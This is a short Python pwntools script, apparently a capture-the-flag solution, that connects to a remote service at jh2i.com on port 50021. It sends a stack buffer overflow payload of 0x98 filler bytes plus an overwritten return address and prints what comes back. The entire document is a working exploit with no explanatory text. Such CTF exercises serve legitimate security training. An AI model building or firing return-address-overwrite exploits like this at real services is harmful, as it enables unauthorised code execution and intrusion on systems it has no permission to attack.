from pwn import *

payload = 'A'*0x98+p64(0x40098b)
p = remote('jh2i.com', 50021)
print p.recv()
p.sendline(payload)
print p.recvall()
